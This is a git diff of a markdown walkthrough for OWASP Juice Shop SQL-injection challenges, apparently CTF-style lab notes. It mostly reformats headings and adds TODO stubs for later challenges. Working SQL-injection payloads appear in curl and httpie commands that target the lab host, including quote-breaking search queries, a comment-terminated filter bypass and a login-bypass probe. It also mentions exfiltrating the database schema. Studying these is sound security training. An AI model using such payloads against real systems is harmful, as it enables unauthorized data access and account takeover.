@@ -4,13 +4,14 @@ Resources
 
 * [SQL injection](https://portswigger.net/web-security/sql-injection)
 
-## Intercept all requests with burp and look for a request with parameters to fuzz
+## Reconnaissance
 
+Intercept all requests with burp and look for a request with parameters to fuzz
 ```bash
 # send to intruder
 #GET /rest/products/search?q=';
 
-# show SQLi vulnerability
+# sql injection vulnerability
 curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo';" | jq
 # output
 {
@@ -30,11 +31,11 @@ curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:300
 curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq
 
 # with firefox or burp edit and send a POST request with ProductId=10
-#http://box-owasp-juice-shop-0eruj:3000/api/BasketItems
-#{"ProductId":10,"BasketId":"6","quantity":1}
+# http://box-owasp-juice-shop-0eruj:3000/api/BasketItems
+# {"ProductId":10,"BasketId":"6","quantity":1}
 ```
 
-#3 Exfiltrate the entire DB schema definition via SQL Injection
+## Exfiltrate the entire DB schema definition via SQL Injection
 
 ```bash
 # Products table has 9 columns (see json above)
@@ -44,6 +45,7 @@ curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:300
 ```
 
 ## Log in with the (non-existing) accountant without ever registering that user
+
 ```bash
 http http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login email=\' password=foo
 # output
@@ -71,6 +73,43 @@ http http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login email="acc0unt4nt
 ```
 
 ## Log in with the administrator's user account
+
+```bash
+TODO
+```
+
+## Log in with Bender's user account
+
+```bash
+TODO
+```
+
+## Log in with Jim's user account
+
+```bash
+TODO
+```
+
+## Let the server sleep for some time
+
+```bash
+TODO
+```
+
+## All your orders are belong to us
+
+```bash
+TODO
+```
+
+## Update multiple product reviews at the same time
+
+```bash
+TODO
+```
+
+## Infect the server with juicy malware by abusing arbitrary command execution
+
 ```bash
 TODO
 ```
